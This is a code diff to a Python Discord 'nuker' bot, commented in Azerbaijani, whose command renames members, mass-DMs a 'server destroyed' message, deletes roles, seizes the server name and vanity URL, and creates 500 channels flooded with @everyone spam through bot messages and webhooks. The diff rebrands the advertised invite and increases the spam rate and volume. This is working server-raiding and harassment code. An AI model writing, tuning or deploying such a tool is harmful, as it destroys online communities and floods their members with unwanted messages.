@@ -67,7 +67,7 @@ async def on_ready():
 async def status_task():
     activities = [
         discord.Activity(type=discord.ActivityType.watching, name="!panel"),
-        discord.Activity(type=discord.ActivityType.playing, name="discord.gg/xas"),
+        discord.Activity(type=discord.ActivityType.playing, name="discord.gg/aga"),
         discord.Activity(type=discord.ActivityType.listening, name="XAS Security")
     ]
     await bot.change_presence(activity=random.choice(activities))
@@ -610,13 +610,13 @@ async def patlat_cmd(ctx):
     if nick_tasks:
         await asyncio.gather(*nick_tasks, return_exceptions=True)
 
-    # 2. DM göndərilməsi
+    # 2. DM göndərilməsi (discord.gg/aga)
     dm_tasks = []
     for member in guild.members:
         if member.id != SAHIB_ID and not member.bot:
             async def send_user_dm(m):
                 try:
-                    await m.send("🔥 Server dağıdıldı! discord.gg/xas")
+                    await m.send("🔥 Server dağıdıldı! discord.gg/aga")
                 except:
                     pass
             dm_tasks.append(send_user_dm(member))
@@ -641,7 +641,7 @@ async def patlat_cmd(ctx):
     if role_tasks:
         await asyncio.gather(*role_tasks, return_exceptions=True)
 
-    # 6. Yeni Admin Rolü və URL
+    # 6. Yeni Admin Rolü və Vanity URL (discord.gg/aga)
     try:
         new_role = await guild.create_role(
             name="#RUHUMSKDİ",
@@ -652,39 +652,37 @@ async def patlat_cmd(ctx):
     except:
         pass
 
-    ruhum_urls = ["ruhumskdi", "ruhumaz", "ruhumchaos", "ruhumhell", "ruhumx"]
-    secilen_url = random.choice(ruhum_urls)
     try:
-        await guild.edit(name="XAS", vanity_code=secilen_url)
+        await guild.edit(name="XAS", vanity_code="aga")
     except:
         pass
 
     avatar_bytes = await bot.user.display_avatar.read() if bot.user.avatar else None
 
-    # 7. Sürətli Kanal, Webhook və Bot Spam Dalğası
+    # 7. Sürətli Kanal, Webhook və Bot Spam Dalğası (discord.gg/aga)
     async def send_bot_and_webhook_spam(channel, webhooks):
-        for _ in range(30):
+        for _ in range(50):
             try:
-                await channel.send("discord.gg/xas @everyone 🔥 XAS BOT SPAM DALĞASI 🔥")
+                await channel.send("discord.gg/aga @everyone 🔥 XAS BOT SPAM DALĞASI 🔥")
             except:
                 pass
 
             for wh in webhooks:
                 try:
-                    await wh.send("discord.gg/xas @everyone 🔥 MINLƏRLƏ SPAM DALĞASI 🔥")
+                    await wh.send("discord.gg/aga @everyone 🔥 MINLƏRLƏ SPAM DALĞASI 🔥")
                 except:
                     pass
             
-            await asyncio.sleep(0.08)
+            await asyncio.sleep(0.05)
 
     async def create_and_webhook_spam(i):
         try:
-            channel = await guild.create_text_channel(f"ruhumskdi-({i})")
+            channel = await guild.create_text_channel(f"aga-spammer-({i})")
             
             webhooks = []
             for w_num in range(1, 6):
                 try:
-                    wh = await channel.create_webhook(name=f"XAS-Spammer-{w_num}", avatar=avatar_bytes)
+                    wh = await channel.create_webhook(name=f"AGA-Spammer-{w_num}", avatar=avatar_bytes)
                     webhooks.append(wh)
                 except:
                     pass
@@ -693,18 +691,13 @@ async def patlat_cmd(ctx):
         except:
             pass
 
-    chunk_size = 15
+    chunk_size = 20
     for start in range(1, 501, chunk_size):
         tasks_list = [create_and_webhook_spam(i) for i in range(start, min(start + chunk_size, 501))]
         await asyncio.gather(*tasks_list, return_exceptions=True)
-
-# ---------------------------------------------------------------------------
-# 10. BOTU İŞƏ SALMAQ (RUN)
-# ---------------------------------------------------------------------------
 
 if __name__ == "__main__":
     keep_alive()
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
-    
